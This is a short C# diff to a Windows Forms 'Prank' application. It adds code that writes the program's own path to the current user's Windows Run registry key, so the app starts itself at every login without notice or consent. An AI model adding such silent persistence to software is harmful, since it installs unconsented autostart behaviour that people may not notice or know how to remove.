@@ -12,11 +12,14 @@ namespace Prank
 {
     public partial class PrankForm : Form
     {
-        
+        private RegistryKey startup_key = 
+            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
         public PrankForm()
         {
             InitializeComponent();
             this.KeyPreview = true;
+            startup_key.SetValue("prnak-sharp", Application.ExecutablePath.ToString());
         }
 
         private void PrankForm_Load(object sender, EventArgs e)
